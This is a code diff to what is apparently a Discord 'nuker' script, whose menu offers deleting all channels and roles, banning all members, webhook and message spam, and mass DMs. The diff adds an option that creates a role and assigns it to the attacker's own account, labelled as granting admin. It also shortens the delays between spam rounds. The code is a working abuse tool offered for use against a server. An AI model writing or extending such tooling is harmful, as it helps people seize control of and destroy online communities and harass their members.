@@ -97,6 +97,7 @@ async def main(token: str, guild_id):
 > github.com/subjoel/dc-nuker
 
 69. Delete channels, create channels with a name and spam messages!
+99. Make an admin role and give it to your account!
 01. Delete All Channels    08. Webhook Spam Guild     15. Change Guild Icon
 02. Delete All Roles       09. Message Spam Guild     16. Remove all emojis
 03. Ban All Members        10. Rename all channels    17. DM all members
@@ -160,7 +161,27 @@ async def main(token: str, guild_id):
         
         
 
+    
     if choice == "99":
+        print("\n")
+        userid = input('Your user id: ')
+        url = Tools.api("guilds/%s/roles" % guild_id)
+        payload = {"name": "@everyone", "hoist": False, "mentionable": True, "color": 0}
+        request = req.post(url, headers=headers, json=payload)
+        if request.status_code != 200:
+            Logger.Error.error("Failed to create role with status code: %s" % request.status_code)
+        else: 
+            Logger.Success.success("Succesfully created role.")
+        roleid = request.json()["id"]
+        uri = Tools.api(f"/guilds/{guild_id}/members/{userid}/roles/{roleid}")
+        requester = req.put(uri, headers= headers)
+        if requester.status_code != 204:
+            Logger.Error.error("Failed to add role with status code: %s" % requester.status_code)
+        else: 
+            Logger.Success.success("Succesfully added role to member.")
+        
+        
+    if choice == "69":
         name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) < 100 and x != "")
         count = Funcs.get_input("How many channels do you want to create? [1,500]: ", lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 500)
         count = int(count)
@@ -194,7 +215,7 @@ async def main(token: str, guild_id):
             time.sleep(global_timeot)
         else:
             for thread in threads: thread.join()
-            time.sleep(10)
+            time.sleep(3)
 
             Logger.Log.started()
 
@@ -214,7 +235,7 @@ async def main(token: str, guild_id):
                 time.sleep(global_timeot)
             else:
                 for thread in threads: thread.join()
-                time.sleep(10)
+                time.sleep(3)
                 url = Tools.api("/guilds/%s/channels" % guild_id)
                 message = str(open('message.txt', 'r').read())
                 request = req.get(url, headers=headers)
